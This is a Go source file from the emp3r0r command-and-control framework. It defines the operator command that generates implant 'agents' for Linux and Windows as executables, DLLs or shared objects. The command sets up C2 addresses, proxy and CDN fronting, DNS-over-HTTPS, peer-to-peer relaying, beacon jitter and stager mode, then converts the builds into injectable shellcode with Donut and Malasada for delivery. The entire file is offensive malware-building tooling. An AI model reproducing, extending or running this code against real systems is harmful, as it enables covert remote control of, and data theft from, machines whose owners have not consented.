package operator

import (
	"slices"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/donut"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/spf13/cobra"
)

const (
	PayloadTypeLinuxExecutable   = "linux_executable"
	PayloadTypeWindowsExecutable = "windows_executable"
	PayloadTypeWindowsDLL        = "windows_dll"
	PayloadTypeLinuxSO           = "linux_so"
)

var PayloadTypeList = []string{
	PayloadTypeLinuxExecutable,
	PayloadTypeLinuxSO,
	PayloadTypeWindowsExecutable,
	PayloadTypeWindowsDLL,
}

var Arch_List_Windows = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Windows_DLL = []string{
	"386",
	"amd64",
	"arm64",
}

var Arch_List_Linux_SO = []string{
	"amd64",
	"386",
	"arm",
	"riscv64",
}

var Arch_List_All = []string{
	"386",
	"amd64",
	"arm",
	"arm64",
	"mips",
	"mips64",
	"riscv64",
}

// CmdGenerateAgent generates agent binary
func CmdGenerateAgent(cmd *cobra.Command, args []string) {
	// Parse flags (UI layer)
	payloadType, _ := cmd.Flags().GetString("type")
	archChoice, _ := cmd.Flags().GetString("arch")

	if !isArchValid(payloadType, archChoice) {
		logging.Errorf("Invalid arch choice")
		return
	}

	// Gather config from flags. Bool flags default to false when omitted.
	p2p, _ := cmd.Flags().GetBool("p2p")
	directC2, _ := cmd.Flags().GetBool("direct-c2")
	persistentRouter, _ := cmd.Flags().GetBool("persistent-router")
	ncsi, _ := cmd.Flags().GetBool("NCSI")
	kcp, _ := cmd.Flags().GetBool("kcp")
	isStager, _ := cmd.Flags().GetBool("stager")

	opts := controllers.AgentConfig{
		CCAddress:        getStringOptPtr(cmd, "cc"),
		CDNProxy:         getStringOptPtr(cmd, "cdn"),
		C2TransportProxy: getStringOptPtr(cmd, "proxy"),
		DoHServer:        getStringOptPtr(cmd, "doh"),
		C2ChannelMode:    getStringOptPtr(cmd, "c2-channel-mode"),
		InitialPeers:     getStringSliceOptPtr(cmd, "peers"),
		P2PTransport:     getStringOptPtr(cmd, "p2p-transport"),
		CCHTTPPort:       getStringOptPtr(cmd, "cc-http-port"),
		PollInterval:     getIntOptPtr(cmd, "interval"),
		Jitter:           getIntOptPtr(cmd, "jitter"),
		IsP2PEnabled:     p2p,
		IsDirectC2:       directC2,
		PersistentRouter: persistentRouter,
		IsNCSIEnabled:    ncsi,
		UseKCP:           kcp,
		IsStager:         isStager,
	}

	// Pass config to controller
	if err := controllers.MakeConfig(opts); err != nil {
		logging.Errorf("Failed to configure agent: %v", err)
		return
	}

	// Build agent (business logic via controller)
	// 1. Generate UUID
	agentUUID := uuid.NewString()

	// 2. Sign UUID with server
	sig, err := client.SignAgent(agentUUID)
	if err != nil {
		logging.Errorf("Failed to sign agent UUID: %v", err)
		return
	}

	buildCfg := controllers.AgentBuildConfig{
		PayloadType:  payloadType,
		Arch:         archChoice,
		Timestamp:    time.Now(),
		WorkSpace:    live.EmpWorkSpace,
		AgentUUID:    agentUUID,
		AgentUUIDSig: sig,
	}

	result, err := controllers.BuildAgent(buildCfg, live.RuntimeConfig)
	if err != nil {
		logging.Errorf("Failed to build agent: %v", err)
		return
	}

	// Success (UI layer)
	logging.Infof("Generated agent UUID: %s", result.AgentUUID)
	logging.Debugf("Config payload: %d bytes", result.ConfigSize)
	logging.Successf("Generated %s from %s and %s", result.OutputFile, result.StubFile, live.EmpConfigFile)

	// Generate shellcode for Windows (UI layer)
	if payloadType == PayloadTypeWindowsExecutable || payloadType == PayloadTypeWindowsDLL {
		err = donut.DonoutPE2Shellcode(result.OutputFile, archChoice)
		if err != nil {
			logging.Warningf("Donut failed to generate shellcode for %s: %v", result.OutputFile, err)
		} else {
			logging.Infof("Donut converted %s into shellcode at %s.bin", result.OutputFile, result.OutputFile)
		}
	}

	// Informational messages (UI layer)
	if payloadType == PayloadTypeLinuxSO {
		err = tools.MalasadaConvert2Shellcode(result.OutputFile, "main", true)
		if err != nil {
			logging.Warningf("Malasada failed to generate shellcode for %s: %v", result.OutputFile, err)
		} else {
			logging.Infof("Malasada converted %s into shellcode at %s.bin", result.OutputFile, result.OutputFile)
			logging.Infof("Look into stager module to deliver this shellcode")
		}
	}
}

func getStringOptPtr(cmd *cobra.Command, name string) *string {
	if cmd.Flags().Changed(name) {
		val, _ := cmd.Flags().GetString(name)
		return &val
	}
	return nil
}

func getIntOptPtr(cmd *cobra.Command, name string) *int {
	if cmd.Flags().Changed(name) {
		val, _ := cmd.Flags().GetInt(name)
		return &val
	}
	return nil
}

func getStringSliceOptPtr(cmd *cobra.Command, name string) *[]string {
	if cmd.Flags().Changed(name) {
		val, _ := cmd.Flags().GetStringSlice(name)
		return &val
	}
	return nil
}

func isArchValid(payload_type, arch_choice string) bool {
	var list []string
	switch payload_type {
	case PayloadTypeWindowsExecutable:
		list = Arch_List_Windows
	case PayloadTypeWindowsDLL:
		list = Arch_List_Windows_DLL
	case PayloadTypeLinuxSO:
		list = Arch_List_Linux_SO
	default:
		list = Arch_List_All
	}
	return slices.Contains(list, arch_choice)
}
